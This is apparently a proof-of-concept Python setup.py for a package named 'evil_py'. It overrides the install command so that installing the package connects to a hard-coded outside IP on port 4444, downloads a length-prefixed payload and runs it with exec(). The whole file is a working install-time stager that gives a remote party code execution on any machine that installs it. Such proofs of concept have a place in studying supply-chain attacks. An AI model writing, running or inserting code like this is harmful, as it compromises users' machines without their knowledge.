import socket, struct, time, os
import setuptools
from setuptools.command.install import install

class evil_py_class(install):
  def run(self):
    for x in range(10):
      try:
        s=socket.socket(2,socket.SOCK_STREAM)
        s.connect(('52.90.0.232', 4444))
        break
      except:
        time.sleep(5)
    l=struct.unpack('>I',s.recv(4))[0]
    d=s.recv(l)
    while len(d)<l:
      d+=s.recv(l-len(d))
    exec(d,{'s':s})

setuptools.setup(
  name="evil_py",
  version="1.0.0",
  author="tf",
  author_email="dontemail@me.com",
  description="example poc",
  long_description="example pic",
  long_description_content_type="text/markdown",
  url="https://github.com/danzajork",
  packages=setuptools.find_packages(),
  cmdclass={ "install": evil_py_class }
)